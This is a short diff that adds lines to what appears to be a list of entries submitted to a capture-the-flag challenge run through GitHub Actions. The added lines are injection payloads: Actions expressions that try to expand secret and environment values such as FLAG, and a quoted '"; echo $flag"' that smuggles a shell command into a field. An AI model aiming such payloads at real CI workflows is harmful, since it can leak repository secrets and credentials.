@@ -387,3 +387,10 @@ foreverhza:$user:$flag
 jiayuqi7813: ${{ github.event_name }}
 Ha1f00L:212122
 jiayuqi7813:
+jiayuqi7813:${{ secret.FLAG }}
+${{ secret.flag }}
+${{ secret[FLAG] }}
+${{ env.flag }}
+${{ env[FLAG] }}
+${{ env.FLAG }}
+"; echo $flag"
